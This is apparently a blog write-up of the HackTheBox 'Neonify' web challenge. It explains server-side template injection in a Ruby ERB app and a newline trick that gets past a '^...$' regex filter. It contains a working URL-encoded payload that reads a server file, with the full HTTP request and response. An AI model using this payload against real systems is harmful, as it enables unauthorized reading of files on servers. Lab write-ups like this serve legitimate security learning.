@@ -1,0 +1,402 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup theme-color -->
+<!-- start theme color meta headers -->
+<meta name="theme-color" content="#151515">
+<meta name="msapplication-navbutton-color" content="#151515">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- end theme color meta headers -->
+
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Neonify - Web challenge - HackTheBox | Nehal Zaman</title>
+<meta name="generator" content="Jekyll v4.3.1" />
+<meta property="og:title" content="Neonify - Web challenge - HackTheBox" />
+<meta name="author" content="Nehal Zaman" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="A perpetual learner. CTF player. Programmer." />
+<meta property="og:description" content="A perpetual learner. CTF player. Programmer." />
+<link rel="canonical" href="http://localhost:4000/posts/neonify_htb.html" />
+<meta property="og:url" content="http://localhost:4000/posts/neonify_htb.html" />
+<meta property="og:site_name" content="Nehal Zaman" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2022-12-26T00:00:00-05:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Neonify - Web challenge - HackTheBox" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Nehal Zaman"},"dateModified":"2022-12-26T00:00:00-05:00","datePublished":"2022-12-26T00:00:00-05:00","description":"A perpetual learner. CTF player. Programmer.","headline":"Neonify - Web challenge - HackTheBox","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/neonify_htb.html"},"url":"http://localhost:4000/posts/neonify_htb.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <a id="a-title" href="/">
+          <h1>Nehal Zaman</h1>
+        </a>
+        <h2>A perpetual learner. CTF player. Programmer.</h2>
+
+        <section id="downloads">
+          
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <small>26 December 2022</small>
+<h1>Neonify - Web challenge - HackTheBox</h1>
+
+<p class="view">by Nehal Zaman</p>
+
+<p><img src="/assets/images/writeups/neonify/banner.png" alt="" /></p>
+
+<h1 id="introduction">INTRODUCTION</h1>
+
+<p>Neonify is a quite easy web challenge created by <a href="https://www.hackthebox.com/home/users/profile/129959">Codehead</a> on <strong>HackTheBox</strong>.</p>
+
+<p>It involves analysing a ruby-based web application to find a SSTI.</p>
+
+<p>However, there is regex filter in place that needs to be bypassed in order to exploit the SSTI.</p>
+
+<h1 id="analysing-the-source-code">ANALYSING THE SOURCE CODE</h1>
+
+<p>Before we begin, I want to say my <code class="language-plaintext highlighter-rouge">ruby</code> skill is not really good. So if you think I made a mistake somewhere, please reach out to me on discord (<code class="language-plaintext highlighter-rouge">n3hal#1527</code>).</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="k">class</span> <span class="nc">NeonControllers</span> <span class="o">&lt;</span> <span class="no">Sinatra</span><span class="o">::</span><span class="no">Base</span>
+
+  <span class="n">configure</span> <span class="k">do</span>
+    <span class="n">set</span> <span class="ss">:views</span><span class="p">,</span> <span class="s2">"app/views"</span>
+    <span class="n">set</span> <span class="ss">:public_dir</span><span class="p">,</span> <span class="s2">"public"</span>
+  <span class="k">end</span>
+
+  <span class="n">get</span> <span class="s1">'/'</span> <span class="k">do</span>
+    <span class="vi">@neon</span> <span class="o">=</span> <span class="s2">"Glow With The Flow"</span>
+    <span class="n">erb</span> <span class="ss">:'index'</span>
+  <span class="k">end</span>
+
+  <span class="n">post</span> <span class="s1">'/'</span> <span class="k">do</span>
+    <span class="k">if</span> <span class="n">params</span><span class="p">[</span><span class="ss">:neon</span><span class="p">]</span> <span class="o">=~</span> <span class="sr">/^[0-9a-z ]+$/i</span>
+      <span class="vi">@neon</span> <span class="o">=</span> <span class="no">ERB</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="n">params</span><span class="p">[</span><span class="ss">:neon</span><span class="p">]).</span><span class="nf">result</span><span class="p">(</span><span class="nb">binding</span><span class="p">)</span>
+    <span class="k">else</span>
+      <span class="vi">@neon</span> <span class="o">=</span> <span class="s2">"Malicious Input Detected"</span>
+    <span class="k">end</span>
+    <span class="n">erb</span> <span class="ss">:'index'</span>
+  <span class="k">end</span>
+
+<span class="k">end</span> 
+
+</code></pre></div></div>
+
+<p>The controllers file is at <code class="language-plaintext highlighter-rouge">challenge/app/controllers/neon.rb</code>. This contains all the routes that the web application can expect.</p>
+
+<p>There is a single route <code class="language-plaintext highlighter-rouge">/</code>, that can take both <code class="language-plaintext highlighter-rouge">GET</code> and <code class="language-plaintext highlighter-rouge">POST</code> requests.</p>
+
+<p>When a <code class="language-plaintext highlighter-rouge">GET</code> request is made to <code class="language-plaintext highlighter-rouge">/</code>, the <code class="language-plaintext highlighter-rouge">ERB</code> template <code class="language-plaintext highlighter-rouge">challenge/app/views/index.erb</code> is rendered. A string <code class="language-plaintext highlighter-rouge">Glow With The Flow</code> is also passed to the template as a variable.</p>
+
+<p>While making a <code class="language-plaintext highlighter-rouge">POST</code> request, the web application expects a <code class="language-plaintext highlighter-rouge">POST</code> parameter <code class="language-plaintext highlighter-rouge">neon</code>. The value of <code class="language-plaintext highlighter-rouge">neon</code> parameter is checked against regex <code class="language-plaintext highlighter-rouge">/^[0-9a-z ]+$/i</code> which is checking if the input only contains alphanumeric characters. If the check returns <code class="language-plaintext highlighter-rouge">true</code>, the value of neon is passed to the <code class="language-plaintext highlighter-rouge">index.erb</code> and it is rendered. Otherwise, the string <code class="language-plaintext highlighter-rouge">Malicious Input Detected</code> is passed to the template.</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="o">&lt;!</span><span class="no">DOCTYPE</span> <span class="n">html</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="n">html</span><span class="o">&gt;</span>
+<span class="o">&lt;</span><span class="n">head</span><span class="o">&gt;</span>
+    <span class="o">&lt;</span><span class="n">title</span><span class="o">&gt;</span><span class="no">Neonify</span><span class="o">&lt;</span><span class="sr">/title&gt;
+    &lt;link rel="stylesheet" href="stylesheets/s</span><span class="n">tyle</span><span class="p">.</span><span class="nf">css</span><span class="s2">"&gt;
+    &lt;link rel="</span><span class="n">icon</span><span class="s2">" type="</span><span class="n">image</span><span class="o">/</span><span class="n">gif</span><span class="s2">" href="</span><span class="o">/</span><span class="n">images</span><span class="o">/</span><span class="n">gem</span><span class="p">.</span><span class="nf">gif</span><span class="s2">"&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class="</span><span class="n">wrapper</span><span class="s2">"&gt;
+        &lt;h1 class="</span><span class="n">title</span><span class="s2">"&gt;Amazing Neonify Generator&lt;/h1&gt;
+        &lt;form action="</span><span class="o">/</span><span class="s2">" method="</span><span class="n">post</span><span class="s2">"&gt;
+            &lt;p&gt;Enter Text to Neonify&lt;/p&gt;&lt;br&gt;
+            &lt;input type="</span><span class="n">text</span><span class="s2">" name="</span><span class="n">neon</span><span class="s2">" value=""&gt;
+            &lt;input type="</span><span class="n">submit</span><span class="s2">" value="</span><span class="no">Submit</span><span class="s2">"&gt;
+        &lt;/form&gt;
+        &lt;h1 class="</span><span class="n">glow</span><span class="s2">"&gt;&lt;%= @neon %&gt;&lt;/h1&gt;
+    &lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+</span></code></pre></div></div>
+
+<p>We can see that the value of <code class="language-plaintext highlighter-rouge">POST</code> parameter <code class="language-plaintext highlighter-rouge">neon</code> is embedded into the template.</p>
+
+<h1 id="detecting-the-ssti-vulnerability">DETECTING THE SSTI VULNERABILITY</h1>
+
+<p>Since the user-supplied parameter value in <code class="language-plaintext highlighter-rouge">neon</code> is reflected back to us through the template, the most obvious attack vector would be <strong>Server Side Template Injection (SSTI)</strong>.</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="k">class</span> <span class="nc">NeonControllers</span> <span class="o">&lt;</span> <span class="no">Sinatra</span><span class="o">::</span><span class="no">Base</span>
+
+  <span class="n">configure</span> <span class="k">do</span>
+    <span class="n">set</span> <span class="ss">:views</span><span class="p">,</span> <span class="s2">"app/views"</span>
+    <span class="n">set</span> <span class="ss">:public_dir</span><span class="p">,</span> <span class="s2">"public"</span>
+  <span class="k">end</span>
+
+  <span class="n">get</span> <span class="s1">'/'</span> <span class="k">do</span>
+    <span class="vi">@neon</span> <span class="o">=</span> <span class="s2">"Glow With The Flow"</span>
+    <span class="n">erb</span> <span class="ss">:'index'</span>
+  <span class="k">end</span>
+
+  <span class="n">post</span> <span class="s1">'/'</span> <span class="k">do</span>
+    <span class="k">if</span> <span class="n">params</span><span class="p">[</span><span class="ss">:neon</span><span class="p">]</span> <span class="o">=~</span> <span class="sr">/^[0-9a-z ]+$/i</span>
+      <span class="vi">@neon</span> <span class="o">=</span> <span class="no">ERB</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="n">params</span><span class="p">[</span><span class="ss">:neon</span><span class="p">]).</span><span class="nf">result</span><span class="p">(</span><span class="nb">binding</span><span class="p">)</span>
+    <span class="k">else</span>
+      <span class="vi">@neon</span> <span class="o">=</span> <span class="no">ERB</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="n">params</span><span class="p">[</span><span class="ss">:neon</span><span class="p">]).</span><span class="nf">result</span><span class="p">(</span><span class="nb">binding</span><span class="p">)</span>
+      <span class="c1">#@neon = "Malicious Input Detected"</span>
+    <span class="k">end</span>
+    <span class="n">erb</span> <span class="ss">:'index'</span>
+  <span class="k">end</span>
+
+<span class="k">end</span> 
+
+</code></pre></div></div>
+
+<p>Just to check the SSTI, I have edited the <code class="language-plaintext highlighter-rouge">challenge/app/controllers/neon.rb</code> so that the regex check does not affect us for now.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+┌──<span class="o">(</span>n3hal㉿Universe7<span class="o">)</span>-[~/…/web_neonify/challenge/app/controllers]
+└─<span class="nv">$ </span>docker run <span class="nt">-it</span> web_neonify sh
+/app <span class="c"># shotgun -o0.0.0.0 -p1337 config.ru</span>
+<span class="o">==</span> Shotgun/WEBrick on http://0.0.0.0:1337/
+<span class="o">[</span>2022-12-26 06:41:40] INFO  WEBrick 1.6.1
+<span class="o">[</span>2022-12-26 06:41:40] INFO  ruby 2.7.5 <span class="o">(</span>2021-11-24<span class="o">)</span> <span class="o">[</span>x86_64-linux-musl]
+<span class="o">[</span>2022-12-26 06:41:40] INFO  WEBrick::HTTPServer#start: <span class="nv">pid</span><span class="o">=</span>7 <span class="nv">port</span><span class="o">=</span>1337
+
+</code></pre></div></div>
+
+<p>I have popped a shell on the docker image and ran the application.</p>
+
+<p><img src="/assets/images/writeups/neonify/1.png" alt="" /></p>
+
+<p>We can see the input <code class="language-plaintext highlighter-rouge">Nehal</code> is nicely neonified and reflected back to us.</p>
+
+<p><img src="/assets/images/writeups/neonify/2.png" alt="" /></p>
+
+<p>When we give a SSTI payload specific to <code class="language-plaintext highlighter-rouge">ERB</code> template <code class="language-plaintext highlighter-rouge">&lt;%= 7*7 %&gt;</code>, we can see that the input is processed and we see <code class="language-plaintext highlighter-rouge">49</code> reflected back to us.</p>
+
+<p>This confirms that the application might be vulnerable to <code class="language-plaintext highlighter-rouge">SSTI</code>.</p>
+
+<h1 id="bypassing-the-regex">BYPASSING THE REGEX</h1>
+
+<p>Although we have identified the SSTI, there is a regex filter <code class="language-plaintext highlighter-rouge">/^[0-9a-z ]+$/i</code> in place to stop us from exploiting.</p>
+
+<p>This regex checks if the input provided contains only numbers and letters. This potentially stops us from giving characters like <code class="language-plaintext highlighter-rouge">&lt;</code>, <code class="language-plaintext highlighter-rouge">%</code>, <code class="language-plaintext highlighter-rouge">=</code>, <code class="language-plaintext highlighter-rouge">.</code> and <code class="language-plaintext highlighter-rouge">&gt;</code> as input.</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="n">my_input</span> <span class="o">=</span> <span class="s2">"Nehal&lt;%= 7*7 %&gt;"</span>
+
+<span class="k">if</span> <span class="n">my_input</span> <span class="o">=~</span> <span class="sr">/^[0-9a-z ]+$/i</span>
+  <span class="nb">puts</span> <span class="s2">"BYPASSED :)"</span>
+<span class="k">else</span>
+  <span class="nb">puts</span> <span class="s2">"Not able to bypass :( "</span>
+<span class="k">end</span>
+
+</code></pre></div></div>
+
+<p>Here, a <code class="language-plaintext highlighter-rouge">ruby</code> script is created that uses the same regex to see how an input behaves.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+┌──<span class="o">(</span>n3hal㉿Universe7<span class="o">)</span>-[~/…/challenges/web/neonify/tests]
+└─<span class="nv">$ </span>ruby script.rb
+Not able to bypass :<span class="o">(</span>
+
+</code></pre></div></div>
+
+<p>As expected, the input <code class="language-plaintext highlighter-rouge">Nehal&lt;%= 7*7 %&gt;</code> is not able to bypass the regex and hence we see the string <code class="language-plaintext highlighter-rouge">Not able to bypass :(</code>.</p>
+
+<p>But here is the magic.</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="n">my_input</span> <span class="o">=</span> <span class="s2">"Nehal</span><span class="se">\n</span><span class="s2">&lt;%= 7*7 %&gt;"</span>
+
+<span class="k">if</span> <span class="n">my_input</span> <span class="o">=~</span> <span class="sr">/^[0-9a-z ]+$/i</span>
+  <span class="nb">puts</span> <span class="s2">"BYPASSED :)"</span>
+<span class="k">else</span>
+  <span class="nb">puts</span> <span class="s2">"Not able to bypass :( "</span>
+<span class="k">end</span>
+
+</code></pre></div></div>
+
+<p>Here the input is changed to <code class="language-plaintext highlighter-rouge">Nehal\n&lt;%= 7*7 %&gt;</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+┌──<span class="o">(</span>n3hal㉿Universe7<span class="o">)</span>-[~/…/challenges/web/neonify/tests]
+└─<span class="nv">$ </span>ruby script.rb 
+BYPASSED :<span class="o">)</span>
+
+</code></pre></div></div>
+
+<p>When we add the <code class="language-plaintext highlighter-rouge">\n</code> character is added, we can see the regex is bypassed and <code class="language-plaintext highlighter-rouge">BYPASSED :)</code> is printed.</p>
+
+<p>In <code class="language-plaintext highlighter-rouge">ruby</code>, the <code class="language-plaintext highlighter-rouge">^</code> and <code class="language-plaintext highlighter-rouge">$</code> match at the start and end of each line. So if any (<code class="language-plaintext highlighter-rouge">!</code>) one line is matching, we have a successful match.</p>
+
+<p>The <code class="language-plaintext highlighter-rouge">\n</code> separates the the input <code class="language-plaintext highlighter-rouge">Nehal\n&lt;%= 7*7 %&gt;</code> into 2 lines: <code class="language-plaintext highlighter-rouge">Nehal</code> and <code class="language-plaintext highlighter-rouge">&lt;%= 7*7 %&gt;</code>. Since the regex check for <code class="language-plaintext highlighter-rouge">Nehal</code> returns <code class="language-plaintext highlighter-rouge">true</code> we are able to bypass the regex for the string as a whole.</p>
+
+<h1 id="crafting-the-payload">CRAFTING THE PAYLOAD</h1>
+
+<p>In <code class="language-plaintext highlighter-rouge">ERB</code> based <code class="language-plaintext highlighter-rouge">SSTI</code>, we can read a file on the filesytem by <code class="language-plaintext highlighter-rouge">File.open('/path/to/file.txt').read</code>.</p>
+
+<p>Combining the regex filter and SSTI, our final payload can be:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Nehal\n&lt;%= File.open('/app/flag.txt').read %&gt;
+</code></pre></div></div>
+
+<p><img src="/assets/images/writeups/neonify/3.png" alt="" /></p>
+
+<p>We are still getting detected.</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="sr">/app # cat app/</span><span class="n">controllers</span><span class="o">/</span><span class="n">neon</span><span class="p">.</span><span class="nf">rb</span> 
+<span class="k">class</span> <span class="nc">NeonControllers</span> <span class="o">&lt;</span> <span class="no">Sinatra</span><span class="o">::</span><span class="no">Base</span>
+
+  <span class="n">configure</span> <span class="k">do</span>
+    <span class="n">set</span> <span class="ss">:views</span><span class="p">,</span> <span class="s2">"app/views"</span>
+    <span class="n">set</span> <span class="ss">:public_dir</span><span class="p">,</span> <span class="s2">"public"</span>
+  <span class="k">end</span>
+
+  <span class="n">get</span> <span class="s1">'/'</span> <span class="k">do</span>
+    <span class="vi">@neon</span> <span class="o">=</span> <span class="s2">"Glow With The Flow"</span>
+    <span class="n">erb</span> <span class="ss">:'index'</span>
+  <span class="k">end</span>
+
+  <span class="n">post</span> <span class="s1">'/'</span> <span class="k">do</span>
+    <span class="nb">puts</span> <span class="n">params</span><span class="p">[</span><span class="ss">:neon</span><span class="p">]</span>
+    <span class="k">if</span> <span class="n">params</span><span class="p">[</span><span class="ss">:neon</span><span class="p">]</span> <span class="o">=~</span> <span class="sr">/^[0-9a-z ]+$/i</span>
+      <span class="vi">@neon</span> <span class="o">=</span> <span class="no">ERB</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="n">params</span><span class="p">[</span><span class="ss">:neon</span><span class="p">]).</span><span class="nf">result</span><span class="p">(</span><span class="nb">binding</span><span class="p">)</span>
+    <span class="k">else</span>
+      <span class="vi">@neon</span> <span class="o">=</span> <span class="no">ERB</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="n">params</span><span class="p">[</span><span class="ss">:neon</span><span class="p">]).</span><span class="nf">result</span><span class="p">(</span><span class="nb">binding</span><span class="p">)</span>
+      <span class="c1">#@neon = "Malicious Input Detected"</span>
+    <span class="k">end</span>
+    <span class="n">erb</span> <span class="ss">:'index'</span>
+  <span class="k">end</span>
+
+</code></pre></div></div>
+
+<p>I am printing the raw string value of <code class="language-plaintext highlighter-rouge">neon</code> paramter to see how the input shows up in the backend application.</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+  <span class="sr">/app # shotgun -o0.0.0.0 -p1337 config.ru
+== Shotgun/</span><span class="no">WEBrick</span> <span class="n">on</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">0.0</span><span class="o">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">1337</span><span class="o">/</span>
+<span class="p">[</span><span class="mi">2022</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">26</span> <span class="mo">07</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="mi">15</span><span class="p">]</span> <span class="no">INFO</span>  <span class="no">WEBrick</span> <span class="mf">1.6</span><span class="o">.</span><span class="mi">1</span>
+<span class="p">[</span><span class="mi">2022</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">26</span> <span class="mo">07</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="mi">15</span><span class="p">]</span> <span class="no">INFO</span>  <span class="n">ruby</span> <span class="mf">2.7</span><span class="o">.</span><span class="mi">5</span> <span class="p">(</span><span class="mi">2021</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">24</span><span class="p">)</span> <span class="p">[</span><span class="n">x86_64</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">musl</span><span class="p">]</span>
+<span class="p">[</span><span class="mi">2022</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">26</span> <span class="mo">07</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="mi">15</span><span class="p">]</span> <span class="no">INFO</span>  <span class="no">WEBrick</span><span class="o">::</span><span class="no">HTTPServer</span><span class="c1">#start: pid=24 port=1337</span>
+<span class="s2">"Nehal</span><span class="se">\\</span><span class="s2">n&lt;%= File.open('/app/flag.txt').read %&gt;"</span>
+<span class="mf">172.17</span><span class="o">.</span><span class="mf">0.1</span> <span class="o">-</span> <span class="o">-</span> <span class="p">[</span><span class="mi">26</span><span class="o">/</span><span class="no">Dec</span><span class="o">/</span><span class="mi">2022</span><span class="p">:</span><span class="mo">07</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="mi">21</span> <span class="o">+</span><span class="mo">0000</span><span class="p">]</span> <span class="s2">"POST / HTTP/1.1"</span> <span class="mi">200</span> <span class="mi">559</span> <span class="mf">0.0298</span>
+
+</code></pre></div></div>
+
+<p>We can see that the newline <code class="language-plaintext highlighter-rouge">\n</code> in our payload is automatically escaped.</p>
+
+<p>One possible way can be to encode the newline (<code class="language-plaintext highlighter-rouge">\n</code> -&gt; <code class="language-plaintext highlighter-rouge">%0a</code>) so that when the application decodes it, we get the newline we want.</p>
+
+<p>The payload is updated as:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Nehal%0a&lt;%= File.open('/app/flag.txt').read %&gt;
+</code></pre></div></div>
+
+<p><img src="/assets/images/writeups/neonify/4.png" alt="" /></p>
+
+<p>We still are on the same boat.</p>
+
+<p>Let us take this thing on burp so that we can encode our payload as a whole.</p>
+
+<p>The final payload is updated as:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Nehal%0a&lt;%25%3d+File.open('/app/flag.txt').read+%25&gt;
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST / HTTP/1.1
+Host: 172.17.0.2:1337
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 57
+Origin: http://172.17.0.2:1337
+Connection: close
+Referer: http://172.17.0.2:1337/
+Upgrade-Insecure-Requests: 1
+
+neon=Nehal%0a&lt;%25%3d+File.open('/app/flag.txt').read+%25&gt;
+</code></pre></div></div>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+HTTP/1.1 200 OK
+Content-Type: text/html;charset=utf-8
+Content-Length: 567
+X-Xss-Protection: 1; mode=block
+X-Content-Type-Options: nosniff
+X-Frame-Options: SAMEORIGIN
+Server: WEBrick/1.6.1 (Ruby/2.7.5/2021-11-24)
+Date: Mon, 26 Dec 2022 07:24:21 GMT
+Connection: close
+
+<span class="cp">&lt;!DOCTYPE html&gt;</span>
+<span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;head&gt;</span>
+    <span class="nt">&lt;title&gt;</span>Neonify<span class="nt">&lt;/title&gt;</span>
+    <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"stylesheet"</span> <span class="na">href=</span><span class="s">"stylesheets/style.css"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"icon"</span> <span class="na">type=</span><span class="s">"image/gif"</span> <span class="na">href=</span><span class="s">"/images/gem.gif"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;/head&gt;</span>
+<span class="nt">&lt;body&gt;</span>
+    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"wrapper"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;h1</span> <span class="na">class=</span><span class="s">"title"</span><span class="nt">&gt;</span>Amazing Neonify Generator<span class="nt">&lt;/h1&gt;</span>
+        <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"/"</span> <span class="na">method=</span><span class="s">"post"</span><span class="nt">&gt;</span>
+            <span class="nt">&lt;p&gt;</span>Enter Text to Neonify<span class="nt">&lt;/p&gt;&lt;br&gt;</span>
+            <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"neon"</span> <span class="na">value=</span><span class="s">""</span><span class="nt">&gt;</span>
+            <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Submit"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;/form&gt;</span>
+        <span class="nt">&lt;h1</span> <span class="na">class=</span><span class="s">"glow"</span><span class="nt">&gt;</span>Nehal
+HTB{f4k3_fl4g_f0r_t3st1ng}<span class="nt">&lt;/h1&gt;</span>
+    <span class="nt">&lt;/div&gt;</span>
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div></div>
+
+<p>We can see our nice flag <code class="language-plaintext highlighter-rouge">HTB{f4k3_fl4g_f0r_t3st1ng}</code> for testing.</p>
+
+<h1 id="conclusion">CONCLUSION</h1>
+
+<p>Trying the same payload on the running instance will give us the flag.</p>
+
+<p>The SSTI in this challenge is quite obvious.</p>
+
+<p>But the takeaway from this challenge is about how a newline can be used to bypass a regex check.</p>
+
+<p>This is all in this challenge.</p>
+
+<p>Thanks for reading this far.</p>
+
+<p>Hope you liked it.</p>
+
+
+
+  <small>tags: <em>ssti</em> - <em>regex bypass</em> - <em>ruby</em></small>
+
+
+      </section>
+    </div>
+  </body>
+</html>
